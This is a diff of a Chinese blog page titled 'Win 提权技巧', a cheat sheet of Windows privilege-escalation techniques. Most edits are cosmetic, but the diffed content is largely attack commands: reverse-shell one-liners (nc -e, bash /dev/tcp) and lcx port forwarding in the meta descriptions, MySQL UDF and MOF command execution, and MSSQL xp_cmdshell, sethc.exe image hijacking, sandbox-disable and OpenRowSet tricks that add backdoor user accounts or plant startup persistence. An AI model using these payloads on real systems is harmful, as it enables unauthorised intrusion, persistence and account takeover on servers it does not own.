@@ -88,14 +88,14 @@
 
 <meta name="description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Win 提权技巧">
+<meta property="og:title" content="Win_提权技巧">
 <meta property="og:url" content="http://MaiKeFee.com/archives/452f04ea.html">
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-05T03:41:53.462Z">
+<meta property="og:updated_time" content="2019-09-05T09:22:50.462Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Win 提权技巧">
+<meta name="twitter:title" content="Win_提权技巧">
 <meta name="twitter:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 
 
@@ -132,7 +132,7 @@
 
 
 
-  <title>Win 提权技巧 | MaiKeFee|</title>
+  <title>Win_提权技巧 | MaiKeFee|</title>
   
 
 
@@ -329,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Win 提权技巧</h1>
+          <h1 class="post-title" itemprop="name headline">Win_提权技巧</h1>
         
 
         <div class="post-meta">
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-05T11:41:53+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-05T17:22:50+08:00">
                 2019-09-05
               </time>
             
@@ -436,7 +436,7 @@
 
           
           
-             <span id="/archives/452f04ea.html" class="leancloud_visitors" data-flag-title="Win 提权技巧">
+             <span id="/archives/452f04ea.html" class="leancloud_visitors" data-flag-title="Win_提权技巧">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -534,8 +534,9 @@ create function cmdshell returns string soname &apos;mstlab.dll&apos;;   #用udf
 select shell(&apos;cmd&apos;,&apos;net user&apos;);     #执行cmd命令</code></pre><p>show variables like ‘%plugin%’;     #查看plugin路径</p>
 <h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><pre><code>1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录
 2.my.ini中datadir的值是数据存放目录
-3.UPDATE user set File_priv =&apos;Y&apos;;  flush privileges; 强制加file权限</code></pre><h2 id="MOF手工提权辅助："><a href="#MOF手工提权辅助：" class="headerlink" title="MOF手工提权辅助："></a>MOF手工提权辅助：</h2><p>#pragma namespace(“\.\root\subscription”) </p>
-<pre><code>instance of __EventFilter as  
+3.UPDATE user set File_priv =&apos;Y&apos;;  flush privileges; 强制加file权限</code></pre><h2 id="MOF手工提权辅助："><a href="#MOF手工提权辅助：" class="headerlink" title="MOF手工提权辅助："></a>MOF手工提权辅助：</h2><pre><code>pragma namespace(&quot;\\.\root\subscription&quot;) 
+
+instance of __EventFilter as  
 { 
     EventNamespace = &quot;Root\Cimv2&quot;; 
     Name  = &quot;filtP2&quot;; 
@@ -563,18 +564,19 @@ instance of __FilterToConsumerBinding
 然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</code></pre><h2 id="SA提权辅助："><a href="#SA提权辅助：" class="headerlink" title="SA提权辅助："></a>SA提权辅助：</h2><h3 id="1-判断扩展存储是否存在："><a href="#1-判断扩展存储是否存在：" class="headerlink" title="1.判断扩展存储是否存在："></a>1.判断扩展存储是否存在：</h3><pre><code>select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos;
 select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;</code></pre><h2 id="恢复："><a href="#恢复：" class="headerlink" title="恢复："></a>恢复：</h2><pre><code>exec sp_dropextendedproc &apos;xp_cmdshell&apos;
 exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos;
-EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)</code></pre><h3 id="2-列目录："><a href="#2-列目录：" class="headerlink" title="2.列目录："></a>2.列目录：</h3><pre><code>  exec master..xp_cmdshell &apos;ver&apos;
-  (or) exec master..xp_dirtree &apos;c:\&apos;,1,1
-  (or) drop table black
-       create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
-       insert into black exec master..xp_cmdshell &apos;dir c:\&apos; 
-       select top 1 mulu from black where id=1
+EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)</code></pre><h3 id="2-列目录："><a href="#2-列目录：" class="headerlink" title="2.列目录："></a>2.列目录：</h3><pre><code>exec master..xp_cmdshell &apos;ver&apos;
+(or) exec master..xp_dirtree &apos;c:\&apos;,1,1
+(or) drop table black
+create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
+insert into black exec master..xp_cmdshell &apos;dir c:\&apos; 
+select top 1 mulu from black where id=1
 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权</code></pre><h3 id="3-备份启动项："><a href="#3-备份启动项：" class="headerlink" title="3.备份启动项："></a>3.备份启动项：</h3><pre><code>alter database [master] set RECOVERY FULL
 create table cmd (a image)
 backup log [master] to disk = &apos;c:\cmd1&apos; with init
 insert into cmd (a) values (0x(batcode))
 backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos;
-drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" class="headerlink" title="4.映像劫持"></a>4.映像劫持</h3><pre><code>xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;</code></pre><h3 id="5-沙盒模式提权："><a href="#5-沙盒模式提权：" class="headerlink" title="5.沙盒模式提权："></a>5.沙盒模式提权：</h3><h2 id="法a："><a href="#法a：" class="headerlink" title="法a："></a>法a：</h2><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Jet.0\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0; #关闭沙盒模式</code></pre><h2 id="法b："><a href="#法b：" class="headerlink" title="法b："></a>法b：</h2><pre><code>Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。
+drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" class="headerlink" title="4.映像劫持"></a>4.映像劫持</h3><pre><code>xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;</code></pre><h3 id="5-沙盒模式提权："><a href="#5-沙盒模式提权：" class="headerlink" title="5.沙盒模式提权："></a>5.沙盒模式提权：</h3><h2 id="法a："><a href="#法a：" class="headerlink" title="法a："></a>法a：</h2><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\JET\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0;</code></pre><p>关闭沙盒模式</p>
+<h2 id="法b："><a href="#法b：" class="headerlink" title="法b："></a>法b：</h2><pre><code>Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。
 开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;</code></pre><h3 id="6-xp-regwrite操作注册表"><a href="#6-xp-regwrite操作注册表" class="headerlink" title="6.xp_regwrite操作注册表"></a>6.xp_regwrite操作注册表</h3><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos;
 开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;</code></pre>
       
@@ -726,7 +728,7 @@ drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" cla
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
